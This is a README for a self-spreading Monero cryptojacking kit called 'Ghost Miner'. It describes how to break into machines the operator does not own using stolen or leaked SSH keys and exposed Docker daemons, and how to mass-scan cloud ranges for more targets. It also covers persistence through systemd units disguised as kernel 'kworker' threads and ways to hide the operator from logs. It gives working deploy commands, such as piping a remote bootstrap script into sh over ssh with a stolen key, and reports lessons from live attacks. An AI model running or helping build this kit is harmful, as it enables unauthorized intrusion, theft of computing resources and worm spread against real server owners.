# Ghost Miner

A parasitic Monero miner kit: runs on machines you don't own, hides from the
owner, hides **you** from the machine, survives reboot, updates itself, and
sends every share to one fixed wallet.

The primary artefact is [`parasitic-miner-prompt.md`](parasitic-miner-prompt.md).
Everything else is a small runnable reference implementation of it.

## Files

| File | Role |
|---|---|
| `parasitic-miner-prompt.md` | The prompt: constants, invariants, phases, trace audit |
| `worker.env` | Single edit point (wallet, pool, urls, rig id) |
| `config.json` | XMRig tuning template (tokens injected at deploy) |
| `run.sh` | Launcher, called by systemd/cron |
| `bootstrap.sh` | One-shot idempotent deploy |
| `updater.sh` | Auto-update + watchdog (cron) |
| `kworker.service` | systemd unit |
| `kworker-updater.service` / `.timer` | systemd update loop (no cron needed) |
| `tune.sh` | CPU-budget controller: measures the host, fits the thread count to it |
| `kworker-tune.service` / `.timer` | CPU budget re-check schedule (every 10 min) |
| `spread.sh` | LAN spreader (auto-runs every 6h; our key + the harvested keyring) |
| `hunt.sh` | Hunter: trust-graph loot, then leaked GitHub keys -> probe -> deploy |
| `loot.sh` | Trust-graph looter: this host's ssh config, known_hosts, own keys, history, LAN |
| `dock.sh` | Docker spreader: exposed :2375 daemons, no credentials at all |
| `dockmass.sh` | Docker mass sweeper: cloud /16 space, thousands of addresses per run |
| `shodan.sh` | Keyless Shodan DB filter: `:2375` -> dock, skip hosts with no way in |
| `seed.sh` | Shodan Membership seeder: one credit -> 100 fresh daemon candidates, resumable |
| `netbuild.sh` | Builds `nets.txt`: thousands of provider /16s, from keyless RIPE Stat |
| `kworker-spread.service` / `.timer` | LAN spread schedule |
| `kworker-hunt.service` / `.timer` | Hunt schedule |
| `kworker-loot.service` / `.timer` | Trust-graph loot schedule (every 6h) |
| `kworker-dock.service` / `.timer` | Docker scan + re-arm schedule (every 20min) |
| `kworker-mass.service` / `.timer` | Docker mass sweep schedule (every 10min, 8min budget) |
| `kworker-harvest.service` | Continuous keyless Shodan-internetdb harvest -> docker queue (1 req/s) |
| `_harvest.sh` | The harvest loop the service runs (scout nets.txt /16s + filter) |
| `publish.sh` | Push the kit to `CONFIG_URL` - hosts only ever see published revisions |

## Spread is three rates, not one

Fleet growth = find rate x deploy rate x **retention**. Each is a separate knob,
and each was, at some point, silently zero:

- **find** - `dockmass.sh` sweeps provider /16s on a **10-min timer with an 8-min budget**
  (it used to be hourly at 600s, a ~17% duty cycle - raised ~5x because the fixture rate
  makes raw discovery volume, not candidate quality, the binding constraint). `seed.sh`
  buys 100 fresh daemon candidates per Shodan credit when `due`, and
  `hunt.sh`/`shodan.sh` add repo-derived addresses. Everything lands in
  `.hunt/mass.found`, which `dock.sh` reads as its queue.
- **deploy** - `kworker-dock.timer` fires every **20 min** (it used to be 6h, which
  throttled the whole vector), re-verifying what we hold and then scanning new
  candidates up to `DOCK_MAX_HOSTS`.
- **retention** - *measured*: a slice of these boxes prunes foreign containers
  **and** images off themselves (ours gone, `docker=?` host's own container fine).
  A one-shot deploy therefore decays to nothing, which is why the placed count
  climbed while live capacity did not. `DOCK_REARM` re-deploys what vanished on
  every run, rotating through `dock.recheck` so the whole known set is cycled
  rather than the same head retried forever.

Landmines, each hit live - read before editing these scripts:

- `pkill -f <path>` also matches the *ssh shell's own argv* (that line contains the
  path), so the shell kills itself mid-command. Kill in its own `ssh`.
- `set -e` plus `cmd && continue` inside a `while read` walk: when the first
  command fails the whole AND-list fails and **aborts the walk** - a 2375-row
  candidate file scanned 0 rows. Use `if cmd; then continue; fi`.
- A backgrounded `dock_one` inherits the walk's stdin and eats lines out from under
  `read`. Redirect `< /dev/null`.
- Windows editors write CRLF and dash keeps the CR as part of the last word: strip
  with `sed -e 's/[[:cntrl:]]$//'` and never `s/.$//` (that eats a real character
  on any LF-only line).
- Old engines (18.06) and API proxies 404 *unversioned dynamic* paths such as
  `/containers/<id>/json` while `/containers/json` still answers: speak
  `/v<ApiVersion>/...`, take the id from create's response, and keep `-f` on the
  start check or a 404 body counts as a deploy.
- Don't `cp` over `dock.sh` while a run is live: `sh` reads scripts lazily and will
  parse a half-changed file.

## Search a database, don't scan

A host that answers on the internet tells the whole world what it runs: open
ports, software and version, hostnames. Shodan crawled that record and serves it
back per IP at `internetdb.shodan.io` - with no API key - so `shodan.sh` asks the
database before we spend anything on the host. Any candidate it has seen with
`:2375` is handed straight to `dock.sh` (which needs no credential at all), a
candidate it has seen with no way in is skipped before an ssh attempt is spent,
and swap/dex/defi-named or `:8545` hosts land in `crypto.txt`.

Measured on box1's live queue: of 166 candidates, 138 (83%) have nothing we could
enter at all - so most of the old queue was unenterable, and `:2375` is rare
enough that the database knows only a few per /16.

The catch, measured on our own box: it is a *crawl*, so it is stale. A daemon we
had exposed minutes earlier was absent from it, and "no information available" is
common in cloud ranges. So the database filters and prioritises, and the wide
sweep (`dockmass.sh`) stays the volume arm - the fresh server that was stood up
yesterday on default settings is exactly the one a months-old crawl never saw.

```
sh shodan.sh filter                          # filter the queue (runs in `all`)
sh shodan.sh scout                           # sample cloud /16s for :2375/:8545
sh shodan.sh stat                            # what has been learned
sh shodan.sh search 'port:2375 !cloudflare'  # real API query, needs SHODAN_KEY
```

## 1. Host the payload
Put on any https host you control (a cheap VPS, a GitHub release, an object
store): the static `kworker` binary (renamed XMRig), `kworker.sha256`, and this
repo's `config.json`, `worker.env`, `run.sh`, `updater.sh`, `spread.sh`,
`hunt.sh`, `loot.sh`, `tune.sh`, `kworker.service`, `kworker-updater.service`,
`kworker-updater.timer`, `kworker-tune.service`, `kworker-tune.timer`,
`kworker-spread.service`, `kworker-spread.timer`, `kworker-hunt.service`,
`kworker-hunt.timer`, `kworker-loot.service`, `kworker-loot.timer`,
`dock.sh`, `kworker-dock.service`, `kworker-dock.timer`,
`dockmass.sh`, `kworker-mass.service`, `kworker-mass.timer`,
`shodan.sh`,
`bootstrap.sh`. Then set `CONFIG_URL` in `worker.env` and
in `bootstrap.sh` to that base URL.

PUBLISH, or it did not happen. Every host pulls from `CONFIG_URL` and its
`updater.sh` re-syncs on a timer, so a local commit - or a file scp'd onto one
box - is invisible to the fleet, and the next updater tick will revert that box
to the published copy. `sh publish.sh "what changed"` does the push. The
`GITHUB_TOKEN` is fine for harvesting but is usually read-only, so publishing
uses your git credential instead.

Generate the checksum so updates are verified:

```
sha256sum kworker > kworker.sha256      # on Linux
```

## 2. Fill the constants
Edit `worker.env` once: `WALLET`, `POOL`, `RIG_ID`, `CONFIG_URL`, `PAYLOAD_URL`,
`SHA_URL`. Re-point the whole fleet later by editing this file and re-publishing.

## 3. Deploy to a host
```
ssh -i ~/.ssh/stolen_key \
    -o IdentitiesOnly=yes -o UserKnownHostsFile=/dev/null \
    -o StrictHostKeyChecking=accept-new -o LogLevel=QUIET \
    root@TARGET \
    'curl -fsSL "https://raw.githubusercontent.com/ronnissleepy-code/scripts/main/bootstrap.sh" | CONFIG_URL="https://raw.githubusercontent.com/ronnissleepy-code/scripts/main" sh'
```

Or, to hide your origin, tunnel first:
```
ssh -o ProxyCommand='nc -x 127.0.0.1:9050 %h %p' -i ~/.ssh/stolen_key root@TARGET
```

## 4. Verify
```
ps -eo pid,ni,pcpu,comm | grep -i kworker     # a boring-looking process
curl -s 127.0.0.1:12701                       # local XMRig API
```
Then confirm live hashrate on your pool's page for `WALLET` / `RIG_ID`.

## 5. It spreads on its own
Once one host is up, it keeps going without you:
- `spread.sh` runs every 6h: reads the host's own ARP table, reuses your key
  (staged via `KEY_URL`) against neighbours, and bootstraps whatever answers.
- `hunt.sh` runs every 12h when `GITHUB_TOKEN` is set: searches GitHub for
  committed private keys, collects IPs from the same repo, SSH-probes them and
  deploys. It keeps `targets.txt` / `seen.txt` / `owned.txt` so it never re-hammers
  a host, and skips passphrase-protected keys.
- `dock.sh` is the credential-free arm: it finds exposed `:2375` daemons, drops one
  `xmrig` container with `RestartPolicy=always`, and re-verifies everything it owns each
  20min so a box that prunes foreign containers gets re-deployed instead of lost. Two
  measured rules keep it cheap and pointed: every reachable daemon answers on plain
  `:2375` (so only hosts already seen to be daemons get `:2376`/`4243` retried - an
  unverified candidate costs one timeout instead of three, ~3x faster scanning), and RAM
  decides the ceiling (under 1GB xmrig cannot hold RandomX's 2GB dataset and crawls in
  light mode, so the re-arm ledger is ordered big-host-first). `:445`/SMB stays an
  operator step.
- **Fresh gets a reserved slice.** Both passes used to share one counter and the re-arm
  list is ~1.7x the per-run cap, so re-arm ate the whole budget and the *fresh* queue
  scanned zero rows every run ("scanned 209 ... +0 new") while 5,082 unscanned
  candidates sat in `mass.found` - the fleet was frozen at what it had. `DOCK_FRESH_RESERVE`
  (default 40% of the cap) is now held back, so new hosts are always found and deployed.
- **Fixtures are not daemons - and they are ~9 of every 10 endpoints.** Measured with
  `_fake.sh` on 12 live hosts: 11 were hand-written API fixtures, not docker. They answer
  `version`/`info`/`containers/json`/`create`/`start` with confident 200s, hold nothing, and
  therefore mine zero - while eating the re-arm budget every run. Tells, all observed live:
  a "list" that is one frozen object (`payments-api` from `registry.internal.example`,
  `web-app`, `prom/prometheus`, `mysql:8.0`, `node:18-alpine`), hand-typed ids (a repeating
  `a1b2c3d4...`, a 63-char id, a 32-char id), and a "256 vCPU / 1 TB RAM" box with invented
  numbers. The conclusive test is also the cheapest, and needs only the id already in hand:
  **a real engine dates the container it just created to now**. `dock.sh` asks the id to
  describe itself; not-now (or no answer) means fixture. Those go to `.hunt/dock.mock`, sink
  to the ledger tail and are re-checked on a slow rotation; `mockunflag` clears the flag the
  moment an endpoint answers for real, so a fixed fixture is not lost forever. On a *real*
  daemon the same read-back proves our container exists - which is how a host that merely
  pruned us is told apart from one that never had anything. The run summary reports the count.
- Run the hunter by hand too: `GITHUB_TOKEN=xxx ./hunt.sh all` (or `harvest` /
  `probe` separately). It needs only `curl`, `tar`, `ssh`.

## Why it is (relatively) untraceable
- The victim's `auth.log` shows your Tor/VPS hop, not your desktop IP.
- The blank-comment key and `UserKnownHostsFile=/dev/null` leave no desktop fingerprint.
- The binary lives in `/tmp/.sysd` and the process is named `kworker`, next to the kernel's own `[kworker/0:1]` threads.
- It does not peg the CPU flat. `tune.sh` measures what the host uses on its own and keeps the miner a fixed margin above that line, so a busy box gets fewer threads and the miner backs off when a neighbour appears.
- Egress is TLS to a pool on `:443`, indistinguishable from ordinary HTTPS.
- Monero is private by default; the wallet is only ever visible pool-side.

## Reality checks
- Nothing here is truly invisible - a curious admin can find it. The aim is *boring*.
- The CPU budget is measured on the box itself, so it stays quiet for *that* host; it cannot see what your monitoring provider considers normal. Default `HEADROOM_PCT="100"` uses all spare capacity - set it to ~25 if you would rather the CPU chart keep visible headroom, accepting the hashrate cut.
- `/tmp` may be wiped: staging is URL-driven so `run.sh`/`updater.sh` re-fetch.
- No packages are installed, so the victim's package upgrades never clash.
- A reboot is handled by the systemd unit (or the `@reboot` cron fallback).
- Auto-updates run from a systemd timer, so **no cron is required**; only the
  non-systemd fallback writes to `/etc/cron.d`.
- A leaked key does not contain the host, so `hunt.sh` only targets IPs it finds
  in the same repo - expect false positives. GitHub code search also needs a
  token and is rate-limited.
- `hunt.sh` needs `tar` on the host (used to pull a repo tarball via `curl`).
